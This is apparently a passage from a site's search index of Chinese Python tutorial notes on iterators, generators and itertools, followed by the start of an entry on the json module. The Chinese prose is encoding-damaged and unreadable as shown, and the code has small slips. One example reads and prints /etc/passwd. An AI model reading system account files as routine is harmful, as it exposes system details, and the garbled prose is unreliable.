è¯­å¥å³å¯å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªç”Ÿæˆå™¨ã€‚è·Ÿæ™®é€šå‡½æ•°ä¸åŒ çš„æ˜¯ï¼Œç”Ÿæˆå™¨åªèƒ½ç”¨äºè¿­ä»£æ“ä½œã€‚ ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°ä¸»è¦ç‰¹å¾æ˜¯å®ƒåªä¼šå›åº”åœ¨è¿­ä»£ä¸­ä½¿ç”¨åˆ°çš„ next æ“ä½œã€‚ä¸€æ—¦ç”Ÿæˆå™¨ å‡½æ•°è¿”å›é€€å‡ºï¼Œè¿­ä»£ç»ˆæ­¢ã€‚ æˆ‘ä»¬åœ¨è¿­ä»£ä¸­é€šå¸¸ä½¿ç”¨çš„ for è¯­å¥ä¼šè‡ªåŠ¨å¤„ç†è¿™äº›ç»†èŠ‚ï¼Œæ‰€ ä»¥ä½ æ— éœ€æ‹…å¿ƒã€‚ å®ç°è¿­ä»£å™¨åè®® æ„å»ºä¸€ä¸ªèƒ½æ”¯æŒè¿­ä»£æ“ä½œçš„è‡ªå®šä¹‰å¯¹è±¡ï¼Œå¹¶å¸Œæœ›æ‰¾åˆ°ä¸€ä¸ªèƒ½å®ç°è¿­ä»£åè®®çš„ ç®€å•æ–¹æ³•ã€‚ ç›®å‰ä¸ºæ­¢ï¼Œåœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šå®ç°è¿­ä»£æœ€ç®€å•çš„æ–¹å¼æ˜¯ä½¿ç”¨ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°. ä½ å¯èƒ½æƒ³å®ç°ä¸€ä¸ªä»¥æ·±åº¦ä¼˜å…ˆæ–¹å¼éå†æ ‘å½¢ èŠ‚ç‚¹çš„ç”Ÿæˆå™¨ã€‚ä¸‹é¢æ˜¯ä»£ç ç¤ºä¾‹: class Node: def __init__(self, value): self._value = value self._children = [] def __repr__(self): return 'Node({!r})'.format(self._value) def add_child(self, node): self._children.append(node) def __iter__(self): return iter(self._children) def depth_first(self): yield self for c in self: yield from c.depth_first() åå‘è¿­ä»£ åæ–¹å‘è¿­ä»£ä¸€ä¸ªåºåˆ— ä½¿ç”¨å†…ç½®çš„ reversed() å‡½æ•°: >>> a = [1, 2, 3, 4] >>> for x in reversed(a): ... print(x) ... 4 3 2 1 åå‘è¿­ä»£ä»…ä»…å½“å¯¹è±¡çš„å¤§å°å¯é¢„å…ˆç¡®å®šæˆ–è€…å¯¹è±¡å®ç°äº† __reversed__() çš„ç‰¹æ®Š æ–¹æ³•æ—¶æ‰èƒ½ç”Ÿæ•ˆã€‚ å¦‚æœä¸¤è€…éƒ½ä¸ç¬¦åˆï¼Œé‚£ä½ å¿…é¡»å…ˆå°†å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªåˆ—è¡¨æ‰è¡Œ: # Print a file backwards f = open('somefile') for line in reversed(list(f)): print(line, end='') è¦æ³¨æ„çš„æ˜¯å¦‚æœå¯è¿­ä»£å¯¹è±¡å…ƒç´ å¾ˆå¤šçš„è¯ï¼Œå°†å…¶é¢„å…ˆè½¬æ¢ä¸ºä¸€ä¸ªåˆ—è¡¨è¦æ¶ˆè€—å¤§é‡ çš„å†…å­˜ å¾ˆå¤šç¨‹åºå‘˜å¹¶ä¸çŸ¥é“å¯ä»¥é€šè¿‡åœ¨è‡ªå®šä¹‰ç±»ä¸Šå®ç° __reversed__() æ–¹æ³•æ¥å®ç°å å‘è¿­ä»£ã€‚æ¯”å¦‚: class Countdown: def __init__(self, start): self.start = start # Forward iterator def __iter__(self): n = self.start while n > 0: yield n n -= 1 # Reverse iterator def __reversed__(self): n=1 while n <= self.start: yield n n += 1 å®šä¹‰ä¸€ä¸ªåå‘è¿­ä»£å™¨å¯ä»¥ä½¿å¾—ä»£ç éå¸¸çš„é«˜æ•ˆï¼Œå› ä¸ºå®ƒä¸å†éœ€è¦å°†æ•°æ®å¡«å……åˆ°ä¸€ ä¸ªåˆ—è¡¨ä¸­ç„¶åå†å»åå‘è¿­ä»£è¿™ä¸ªåˆ—è¡¨: from collections import deque class linehistory: def __init__(self, lines, histlen=3): self.lines = lines self.history = deque(maxlen=histlen) def __iter__(self): for lineno, line in enumerate(self.lines, 1): self.history.append((lineno, line)) yield line def clear(self): self.history.clear() å¸¦æœ‰å¤–éƒ¨çŠ¶æ€çš„ç”Ÿæˆå™¨å‡½æ•° å®šä¹‰ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°ï¼Œä½†æ˜¯å®ƒä¼šè°ƒç”¨æŸä¸ªä½ æƒ³æš´éœ²ç»™ç”¨æˆ·ä½¿ç”¨çš„å¤–éƒ¨çŠ¶æ€å€¼ å¦‚æœä½ æƒ³è®©ä½ çš„ç”Ÿæˆå™¨æš´éœ²å¤–éƒ¨çŠ¶æ€ç»™ç”¨æˆ·ï¼Œåˆ«å¿˜äº†ä½ å¯ä»¥ç®€å•çš„å°†å®ƒå®ç°ä¸ºä¸€ ä¸ªç±»ï¼Œç„¶åæŠŠç”Ÿæˆå™¨å‡½æ•°æ”¾åˆ° __iter__() æ–¹æ³•ä¸­è¿‡å» è¿­ä»£å™¨åˆ‡ç‰‡ ä½ æƒ³å¾—åˆ°ä¸€ä¸ªç”±è¿­ä»£å™¨ç”Ÿæˆçš„åˆ‡ç‰‡å¯¹è±¡ï¼Œä½†æ˜¯æ ‡å‡†åˆ‡ç‰‡æ“ä½œå¹¶ä¸èƒ½åšåˆ°ã€‚ å‡½æ•° itertools.islice() æ­£å¥½é€‚ç”¨äºåœ¨è¿­ä»£å™¨å’Œç”Ÿæˆå™¨ä¸Šåšåˆ‡ç‰‡æ“ä½œã€‚æ¯”å¦‚: >>> def count(n): ... while True: ... yield n ... n += 1 ... >>> c = count(0) >>> c[10:20] Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'generator' object is not subscriptable >>> # Now using islice() >>> import itertools >>> for x in itertools.islice(c, 10, 20): ... print(x) ... 10 11 12 13 14 15 16 17 18 19 >>> è¿­ä»£å™¨å’Œç”Ÿæˆå™¨ä¸èƒ½ä½¿ç”¨æ ‡å‡†çš„åˆ‡ç‰‡æ“ä½œï¼Œå› ä¸ºå®ƒä»¬çš„é•¿åº¦äº‹å…ˆæˆ‘ä»¬å¹¶ä¸çŸ¥é“ (å¹¶ ä¸”ä¹Ÿæ²¡æœ‰å®ç°ç´¢å¼•)ã€‚ å‡½æ•° islice() è¿”å›ä¸€ä¸ªå¯ä»¥ç”ŸæˆæŒ‡å®šå…ƒç´ çš„è¿­ä»£å™¨ï¼Œå®ƒé€šè¿‡é å†å¹¶ä¸¢å¼ƒç›´åˆ°åˆ‡ç‰‡å¼€å§‹ç´¢å¼•ä½ç½®çš„æ‰€æœ‰å…ƒç´ ã€‚ ç„¶åæ‰å¼€å§‹ä¸€ä¸ªä¸ªçš„è¿”å›å…ƒç´ ï¼Œå¹¶ç›´åˆ°åˆ‡ ç‰‡ç»“æŸç´¢å¼•ä½ç½®ã€‚ è¿™é‡Œè¦ç€é‡å¼ºè°ƒçš„ä¸€ç‚¹æ˜¯ islice() ä¼šæ¶ˆè€—æ‰ä¼ å…¥çš„è¿­ä»£å™¨ä¸­çš„æ•°æ®ã€‚ å¿…é¡»è€ƒè™‘åˆ° è¿­ä»£å™¨æ˜¯ä¸å¯é€†çš„è¿™ä¸ªäº‹å®ã€‚æ‰€ä»¥å¦‚æœä½ éœ€è¦ä¹‹åå†æ¬¡è®¿é—®è¿™ä¸ªè¿­ä»£å™¨çš„è¯ï¼Œé‚£ä½ å°±å¾— å…ˆå°†å®ƒé‡Œé¢çš„æ•°æ®æ”¾å…¥ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚ è·³è¿‡å¯è¿­ä»£å¯¹è±¡çš„å¼€å§‹éƒ¨åˆ† ä½ æƒ³éå†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œä½†æ˜¯å®ƒå¼€å§‹çš„æŸäº›å…ƒç´ ä½ å¹¶ä¸æ„Ÿå…´è¶£ï¼Œæƒ³è·³è¿‡å®ƒä»¬ã€‚ itertools æ¨¡å—ä¸­æœ‰ä¸€äº›å‡½æ•°å¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚é¦–å…ˆä»‹ç»çš„æ˜¯ itertools. dropwhile() å‡½æ•°ã€‚ ä½¿ç”¨æ—¶ï¼Œä½ ç»™å®ƒä¼ é€’ä¸€ä¸ªå‡½æ•°å¯¹è±¡å’Œä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ã€‚ å®ƒä¼šè¿” å›ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œä¸¢å¼ƒåŸæœ‰åºåˆ—ä¸­ç›´åˆ°å‡½æ•°è¿”å› Flase ä¹‹å‰çš„æ‰€æœ‰å…ƒç´ ï¼Œç„¶åè¿”å›å é¢æ‰€æœ‰å…ƒç´ ã€‚ å¦‚æœä½ æƒ³è·³è¿‡å¼€å§‹éƒ¨åˆ†çš„æ³¨é‡Šè¡Œçš„è¯ï¼Œå¯ä»¥è¿™æ ·åš: >>> from itertools import dropwhile >>> with open('/etc/passwd') as f: ... for line in dropwhile(lambda line: line.startswith('#'), f): ... print(line, end='') ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh ... >>> è¿™ä¸ªä¾‹å­æ˜¯åŸºäºæ ¹æ®æŸä¸ªæµ‹è¯•å‡½æ•°è·³è¿‡å¼€å§‹çš„å…ƒç´ ã€‚ å¦‚æœä½ å·²ç»æ˜ç¡®çŸ¥é“äº†è¦è·³ è¿‡çš„å…ƒç´ çš„ä¸ªæ•°çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ itertools.islice() æ¥ä»£æ›¿ã€‚æ¯”å¦‚: >>> from itertools import islice >>> items = ['a', 'b', 'c', 1, 4, 10, 15] >>> for x in islice(items, 3, None): ... print(x) ... 1 4 10 15 islice() å‡½æ•°æœ€åé‚£ä¸ª None å‚æ•°æŒ‡å®šäº†ä½ è¦è·å–ä»ç¬¬ 3 ä¸ªåˆ°æœ€ åçš„æ‰€æœ‰å…ƒç´ ï¼Œ å¦‚æœ None å’Œ 3 çš„ä½ç½®å¯¹è°ƒï¼Œæ„æ€å°±æ˜¯ä»…ä»…è·å–å‰ä¸‰ä¸ªå…ƒç´ æ°æ°ç›¸åï¼Œ (è¿™ä¸ªè·Ÿåˆ‡ç‰‡çš„ç›¸åæ“ä½œ [3:] å’Œ [:3] åŸç†æ˜¯ä¸€æ ·çš„)ã€‚ æ’åˆ—ç»„åˆçš„è¿­ä»£ ä½ æƒ³è¿­ä»£éå†ä¸€ä¸ªé›†åˆä¸­å…ƒç´ çš„æ‰€æœ‰å¯èƒ½çš„æ’åˆ—æˆ–ç»„åˆ, å³ å…¨æ’åˆ— é—®é¢˜. itertools æ¨¡å—æä¾›äº†ä¸‰ä¸ªå‡½æ•°æ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚ å…¶ä¸­ä¸€ä¸ªæ˜¯ itertools.permutations() ï¼Œå®ƒæ¥å—ä¸€ä¸ªé›†åˆå¹¶äº§ç”Ÿä¸€ä¸ªå…ƒç»„åºåˆ—ï¼Œæ¯ä¸ªå…ƒç»„ç”±é›†åˆä¸­æ‰€æœ‰ å…ƒç´ çš„ä¸€ä¸ªå¯èƒ½æ’åˆ—ç»„æˆã€‚ ä¹Ÿå°±æ˜¯è¯´é€šè¿‡æ‰“ä¹±é›†åˆä¸­å…ƒç´ æ’åˆ—é¡ºåºç”Ÿæˆä¸€ä¸ªå…ƒç»„ï¼Œæ¯” å¦‚: >>> items = ['a', 'b', 'c'] >>> from itertools import permutations >>> for p in permutations(items): ... print(p) ... ('a', 'b', 'c') ('a', 'c', 'b') ('b', 'a', 'c') ('b', 'c', 'a') ('c', 'a', 'b') ('c', 'b', 'a') >>> å¦‚æœä½ æƒ³å¾—åˆ°æŒ‡å®šé•¿åº¦çš„æ‰€æœ‰æ’åˆ—ï¼Œä½ å¯ä»¥ä¼ é€’ä¸€ä¸ªå¯é€‰çš„é•¿åº¦å‚æ•°ã€‚å°±åƒè¿™æ ·: >>> for p in permutations(items, 2): ... print(p) ... ('a', 'b') ('a', 'c') ('b', 'a') ('b', 'c') ('c', 'a') ('c', 'b') >>> ä½¿ç”¨ itertools.combinations() å¯å¾—åˆ°è¾“å…¥é›†åˆä¸­å…ƒç´ çš„æ‰€æœ‰çš„ç»„åˆã€‚æ¯”å¦‚: >>> from itertools import combinations >>> for c in combinations(items, 3): ... print(c) ... ('a', 'b', 'c') >>> for c in combinations(items, 2): ... print(c) ... ('a', 'b') ('a', 'c') ('b', 'c') >>> for c in combinations(items, 1): ... print(c) ... ('a',) ('b',) ('c',) >>> å¯¹äº combinations() æ¥è®²ï¼Œå…ƒç´ çš„é¡ºåºå·²ç»ä¸é‡è¦äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œç»„åˆ ('a', 'b') è·Ÿ ('b', 'a') å…¶å®æ˜¯ä¸€æ ·çš„ (æœ€ç»ˆåªä¼šè¾“å‡ºå…¶ä¸­ä¸€ä¸ª)ã€‚ åœ¨è®¡ç®—ç»„åˆçš„æ—¶å€™ï¼Œä¸€æ—¦å…ƒç´ è¢«é€‰å–å°±ä¼šä»å€™é€‰ä¸­å‰”é™¤æ‰ (æ¯”å¦‚å¦‚æœå…ƒ ç´ 'a'å·²ç»è¢«é€‰å–äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¸ä¼šå†è€ƒè™‘å®ƒäº†)ã€‚ è€Œå‡½æ•° itertools. combinations_with_replacement() å…è®¸åŒä¸€ä¸ªå…ƒç´ è¢«é€‰æ‹©å¤šæ¬¡ï¼Œæ¯”å¦‚: >>> for c in combinations_with_replacement(items, 3): ... print(c) ... ('a', 'a', 'a') ('a', 'a', 'b') ('a', 'a', 'c') ('a', 'b', 'b') ('a', 'b', 'c') ('a', 'c', 'c') ('b', 'b', 'b') ('b', 'b', 'c') ('b', 'c', 'c') ('c', 'c', 'c') >>> å½“æˆ‘ä»¬ç¢°åˆ°çœ‹ä¸Šå»æœ‰äº›å¤æ‚çš„è¿­ ä»£é—®é¢˜æ—¶ï¼Œæœ€å¥½å¯ä»¥å…ˆå»çœ‹çœ‹ itertools æ¨¡å—ã€‚ å¦‚æœè¿™ä¸ªé—®é¢˜å¾ˆæ™®éï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½ä¼šåœ¨ é‡Œé¢æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ! åºåˆ—ä¸Šç´¢å¼•å€¼è¿­ä»£ ä½ æƒ³åœ¨è¿­ä»£ä¸€ä¸ªåºåˆ—çš„åŒæ—¶è·Ÿè¸ªæ­£åœ¨è¢«å¤„ç†çš„å…ƒç´ ç´¢å¼•ã€‚ å†…ç½®çš„ enumerate() å‡½æ•°å¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜, enumerate æ¥å—ä¸€ä¸ªå‚æ•°ä½œä¸ºèµ·å§‹åºå·, é»˜è®¤ä¸º0: >>> my_list = ['a', 'b', 'c'] >>> for idx, val in enumerate(my_list, 1): ... print(idx, val) ... 1a 2b 3c enumerate() å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª enumerate å¯¹è±¡å®ä¾‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿”å›è¿ ç»­çš„åŒ…å«ä¸€ä¸ªè®¡æ•°å’Œä¸€ä¸ªå€¼çš„å…ƒç»„ï¼Œ å…ƒç»„ä¸­çš„å€¼é€šè¿‡åœ¨ä¼ å…¥åºåˆ—ä¸Šè°ƒç”¨ next() è¿”å›ã€‚ è¿˜æœ‰ä¸€ç‚¹å¯èƒ½å¹¶ä¸å¾ˆé‡è¦ï¼Œä½†æ˜¯ä¹Ÿå€¼å¾—æ³¨æ„ï¼Œæœ‰æ—¶å€™å½“ä½ åœ¨ä¸€ä¸ªå·²ç»è§£å‹åçš„å…ƒç»„ åºåˆ—ä¸Šä½¿ç”¨ enumerate() å‡½æ•°æ—¶å¾ˆå®¹æ˜“è°ƒå…¥é™·é˜±ã€‚ ä½ å¾—åƒä¸‹é¢æ­£ç¡®çš„æ–¹å¼è¿™æ ·å†™: data = [ (1, 2), (3, 4), (5, 6), (7, 8) ] # Correct! for n, (x, y) in enumerate(data): ... # Error! for n, x, y in enumerate(data): ... åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ— ä½ æƒ³åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—ï¼Œæ¯æ¬¡åˆ†åˆ«ä»ä¸€ä¸ªåºåˆ—ä¸­å–ä¸€ä¸ªå…ƒç´ ã€‚ ä½¿ç”¨ zip() å‡½æ•°: >>> xpts = [1, 5, 4, 2, 10, 7] >>> ypts = [101, 78, 37, 15, 62, 99] >>> for x, y in zip(xpts, ypts): ... print(x,y) ... 1 101 5 78 4 37 2 15 10 62 7 99 >>> zip(a, b) ä¼šç”Ÿæˆä¸€ä¸ªå¯è¿”å›å…ƒç»„ (x, y) çš„è¿­ä»£å™¨ï¼Œå…¶ä¸­ x æ¥è‡ª aï¼Œy æ¥è‡ª bã€‚ ä¸€ æ—¦å…¶ä¸­æŸä¸ªåºåˆ—åˆ°åº•ç»“å°¾ï¼Œè¿­ä»£å®£å‘Šç»“æŸã€‚å› æ­¤è¿­ä»£é•¿åº¦è·Ÿå‚æ•°ä¸­æœ€çŸ­åºåˆ—é•¿åº¦ä¸€è‡´ã€‚ å¦‚æœè¿™ä¸ªä¸æ˜¯ä½ æƒ³è¦çš„æ•ˆæœï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ itertools.zip_longest() å‡½æ•°æ¥ ä»£æ›¿: >>> from itertools import zip_longest >>> for i in zip_longest(a,b): ... print(i) ... (1, 'w') (2, 'x') (3, 'y') (None, 'z') >>> for i in zip_longest(a, b, fillvalue=0): ... print(i) ... (1, 'w') (2, 'x') (3, 'y') (0, 'z') >>> ä¸åŒé›†åˆä¸Šå…ƒç´ çš„è¿­ä»£ ä½ æƒ³åœ¨å¤šä¸ªå¯¹è±¡æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œä½†æ˜¯è¿™äº›å¯¹è±¡åœ¨ä¸åŒçš„å®¹å™¨ä¸­ï¼Œä½ å¸Œæœ›ä»£ç åœ¨ä¸ å¤±å¯è¯»æ€§çš„æƒ…å†µä¸‹é¿å…å†™é‡å¤çš„å¾ªç¯ã€‚ itertools.chain() æ–¹æ³•å¯ä»¥ç”¨æ¥ç®€åŒ–è¿™ä¸ªä»»åŠ¡ã€‚ å®ƒæ¥å—ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡åˆ—è¡¨ä½œ ä¸ºè¾“å…¥ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œæœ‰æ•ˆçš„å±è”½æ‰åœ¨å¤šä¸ªå®¹å™¨ä¸­è¿­ä»£ç»†èŠ‚ã€‚ ä¸ºäº†æ¼”ç¤ºæ¸…æ¥šï¼Œè€ƒ è™‘ä¸‹é¢è¿™ä¸ªä¾‹å­: >>> from itertools import chain >>> a = [1, 2, 3, 4] >>> b = ['x', 'y', 'z'] >>> for x in chain(a, b): ... print(x) ... 1 2 3 4 x y z >>> tertools.chain() æ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå¯è¿­ä»£å¯¹è±¡æœ€ä¸ºè¾“å…¥å‚æ•°ã€‚ ç„¶ååˆ›å»ºä¸€ä¸ªè¿­ ä»£å™¨ï¼Œä¾æ¬¡è¿ç»­çš„è¿”å›æ¯ä¸ªå¯è¿­ä»£å¯¹è±¡ä¸­çš„å…ƒç´ ã€‚ è¿™ç§æ–¹å¼è¦æ¯”å…ˆå°†åºåˆ—åˆå¹¶å†è¿­ä»£è¦ é«˜æ•ˆçš„å¤šã€‚ åˆ›å»ºæ•°æ®å¤„ç†ç®¡é“ ä»¥æ•°æ®ç®¡é“ (ç±»ä¼¼ Unix ç®¡é“) çš„æ–¹å¼è¿­ä»£å¤„ç†æ•°æ®ã€‚æ¯”å¦‚ï¼Œä½ æœ‰ä¸ªå¤§é‡çš„æ•°æ® éœ€è¦å¤„ç†ï¼Œä½†æ˜¯ä¸èƒ½å°†å®ƒä»¬ä¸€æ¬¡æ€§æ”¾å…¥å†…å­˜ä¸­ã€‚ ç”Ÿæˆå™¨å‡½æ•°æ˜¯ä¸€ä¸ªå®ç°ç®¡é“æœºåˆ¶çš„å¥½åŠæ³• å‡½æ•°å†…ä½¿ç”¨ yield ä½œä¸ºç”Ÿäº§è€…, å¤–éƒ¨ for ä½œä¸º æ¶ˆè´¹è€…, æ¥ç»„æˆå¤„ç†ç®¡é“. å±•å¼€åµŒå¥—çš„åºåˆ— ä½ æƒ³å°†ä¸€ä¸ªå¤šå±‚åµŒå¥—çš„åºåˆ—å±•å¼€æˆä¸€ä¸ªå•å±‚åˆ—è¡¨ yield from åœ¨ä½ æƒ³åœ¨ç”Ÿæˆå™¨ä¸­è°ƒç”¨å…¶ä»–ç”Ÿæˆå™¨ä½œä¸ºå­ä¾‹ç¨‹çš„æ—¶å€™éå¸¸æœ‰ç”¨ é¡ºåºè¿­ä»£åˆå¹¶åçš„æ’åºè¿­ä»£å¯¹è±¡ æœ‰ä¸€ç³»åˆ—æ’åºåºåˆ—ï¼Œæƒ³å°†å®ƒä»¬åˆå¹¶åå¾—åˆ°ä¸€ä¸ªæ’åºåºåˆ—å¹¶åœ¨ä¸Šé¢è¿­ä»£éå†ã€‚ heapq.merge() å‡½æ•°: >>> import heapq >>> a = [1, 4, 7, 10] >>> b = [2, 5, 6, 11] >>> for c in heapq.merge(a, b): ... print(c) ... 1 2 4 5 6 7 10 11 heapq.merge å¯è¿­ä»£ç‰¹æ€§æ„å‘³ç€å®ƒä¸ä¼šç«‹é©¬è¯»å–æ‰€æœ‰åºåˆ—ã€‚è¿™å°±æ„å‘³ç€ä½ å¯ä»¥åœ¨ éå¸¸é•¿çš„åºåˆ—ä¸­ä½¿ç”¨å®ƒï¼Œè€Œä¸ä¼šæœ‰å¤ªå¤§çš„å¼€é”€ã€‚ æ¯”å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­æ¥æ¼”ç¤ºå¦‚ä½•åˆå¹¶ ä¸¤ä¸ªæ’åºæ–‡ä»¶: with open('sorted_file_1', 'rt') as file1, \\ open('sorted_file_2', 'rt') as file2, \\ open('merged_file', 'wt') as outf: for line in heapq.merge(file1, file2): outf.write(line) æœ‰ä¸€ç‚¹è¦å¼ºè°ƒçš„æ˜¯ heapq.merge() éœ€è¦æ‰€æœ‰è¾“å…¥åºåˆ—å¿…é¡»æ˜¯æ’è¿‡åºçš„ã€‚ ç‰¹åˆ«çš„ï¼Œ å®ƒå¹¶ä¸ä¼šé¢„å…ˆè¯»å–æ‰€æœ‰æ•°æ®åˆ°å †æ ˆä¸­æˆ–è€…é¢„å…ˆæ’åºï¼Œä¹Ÿä¸ä¼šå¯¹è¾“å…¥åšä»»ä½•çš„æ’åºæ£€æµ‹ã€‚ å®ƒä»…ä»…æ˜¯æ£€æŸ¥æ‰€æœ‰åºåˆ—çš„å¼€å§‹éƒ¨åˆ†å¹¶è¿”å›æœ€å°çš„é‚£ä¸ªï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸€ç›´ä¼šæŒç»­ç›´åˆ°æ‰€æœ‰ è¾“å…¥åºåˆ—ä¸­çš„å…ƒç´ éƒ½è¢«éå†å®Œã€‚ è¿­ä»£å™¨ä»£æ›¿ while æ— é™å¾ªç¯ ä½ åœ¨ä»£ç ä¸­ä½¿ç”¨ while å¾ªç¯æ¥è¿­ä»£å¤„ç†æ•°æ®ï¼Œå› ä¸ºå®ƒéœ€è¦è°ƒç”¨æŸä¸ªå‡½æ•°æˆ–è€…å’Œä¸€ èˆ¬è¿­ä»£æ¨¡å¼ä¸åŒçš„æµ‹è¯•æ¡ä»¶ã€‚ èƒ½ä¸èƒ½ç”¨è¿­ä»£å™¨æ¥é‡å†™è¿™ä¸ªå¾ªç¯å‘¢? ä¸€ä¸ªå¸¸è§çš„ IO æ“ä½œç¨‹åºå¯èƒ½ä¼šæƒ³ä¸‹é¢è¿™æ ·: CHUNKSIZE = 8192 def reader(s): while True: data = s.recv(CHUNKSIZE) if data == b'': break process_data(data) è¿™ç§ä»£ç é€šå¸¸å¯ä»¥ä½¿ç”¨ iter() æ¥ä»£æ›¿ï¼Œå¦‚ä¸‹æ‰€ç¤º: def reader2(s): for chunk in iter(lambda: s.recv(CHUNKSIZE), b''): pass # process_data(data) iter å‡½æ•°ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„ç‰¹æ€§æ˜¯å®ƒæ¥å—ä¸€ä¸ªå¯é€‰çš„ callable å¯¹è±¡å’Œä¸€ä¸ªæ ‡è®° (ç»“ å°¾) å€¼ä½œä¸ºè¾“å…¥å‚æ•°ã€‚ å½“ä»¥è¿™ç§æ–¹å¼ä½¿ç”¨çš„æ—¶å€™ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿™ä¸ªè¿­ä»£å™¨ä¼š ä¸æ–­è°ƒç”¨ callable å¯¹è±¡ç›´åˆ°è¿”å›å€¼å’Œæ ‡è®°å€¼ç›¸ç­‰ä¸ºæ­¢ã€‚ è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨åŒºåˆ« è¿­ä»£å™¨æä¾›ä¸€ç§é¡ºåºè®¿é—®é›†åˆæˆ–åºåˆ—å…ƒç´ çš„æ–¹å¼ï¼Œä½¿ç”¨ next() æ–¹æ³•è·å–æ¯ä¸ªå…ƒç´ ã€‚ ç”Ÿæˆå™¨æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„å‡½æ•°ï¼Œé€šè¿‡ä½¿ç”¨ yield å…³é”®å­—ç”Ÿæˆåºåˆ—å€¼ï¼Œ æ¯æ¬¡è°ƒç”¨ç”Ÿæˆå™¨å‡½æ•°è¿”å›ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œé€šè¿‡è¿­ä»£å™¨å¯¹è±¡å¯ä»¥æŒ‰éœ€è·å–ç”Ÿæˆçš„åºåˆ—å€¼ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Iterator,-generator.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Iterator,-generator.html"},{"title":"json","text":"å››å¤§æ–¹æ³•: json.load å°†æ–‡ä»¶ä¸­çš„jsonçš„æ ¼å¼è½¬åŒ–æˆpythonå¯¹è±¡æå–å‡ºæ¥, æ“ä½œçš„æ˜¯æ–‡ä»¶æµ json.loads å°†Jsonå­—ç¬¦ä¸²è§£ç æˆpythonå¯¹è±¡, æ“ä½œçš„æ˜¯å­—ç¬¦ä¸² json.dump å°†pythonä¸­çš„å¯¹è±¡è½¬åŒ–æˆjsonå‚¨å­˜åˆ°æ–‡ä»¶ä¸­, éœ€è¦ä¼ å…¥æ‰“å¼€çš„æ–‡ä»¶æµ json.dumps å°†pythonå¯¹è±¡ç¼–ç æˆJsonå­—ç¬¦ä¸² dump()åŠå…¶å‚æ•° load()çš„å‚æ•° æˆ‘ä»¬å…ˆçœ‹ä¸‹json.loadsæ–¹æ³•çš„ç­¾å: def loads(s, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw): \"\"\"Deserialize ``s`` (a ``str`` or ``unicode`` instance containing a JSON # æŠŠä¸€ä¸ªå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥æ˜¯strç±»å‹çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯unicodeç±»å‹çš„ document) to a Python object. If ``s`` is a ``str`` instance and is encoded with an ASCII based encoding # å¦‚æœå‚æ•°sæ˜¯ä»¥ASCIIç¼–ç çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦æ‰‹åŠ¨é€šè¿‡å‚æ•°encodingæŒ‡å®šç¼–ç æ–¹å¼ï¼Œ other than utf-8 (e.g. latin-1) then an appropriate ``encoding`` name # ä¸æ˜¯ä»¥ASCIIç¼–ç çš„å­—ç¬¦ä¸²ï¼Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œä½ å¿…é¡»æŠŠå®ƒè½¬ä¸ºunicode must be specified. Encodings that are not ASCII based (such as UCS-2) are not allowed and should be decoded to ``unicode`` first. ``object_hook`` is an optional function that will be called with the # object_hookå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒä¼šå°†ï¼ˆloadsçš„)è¿”å›ç»“æœå­—å…¸æ›¿æ¢ä¸ºä½ æ‰€æŒ‡å®šçš„ç±»å‹ result of any object literal decode (a ``dict``). The return value of # è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥å®ç°è‡ªå®šä¹‰è§£ç å™¨ï¼Œå¦‚JSON-RPC ``object_hook`` will be used instead of the ``dict``. This feature can be used to implement custom decoders (e.g. JSON-RPC class hinting). ``object_pairs_hook`` is an optional function that will be called with the # object_pairs_hookå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒä¼šå°†ç»“æœä»¥key-valueåˆ—è¡¨çš„å½¢å¼è¿”å› result of any object literal decoded with an ordered list of pairs. The # å½¢å¼å¦‚ï¼š[(k1, v1), (k2, 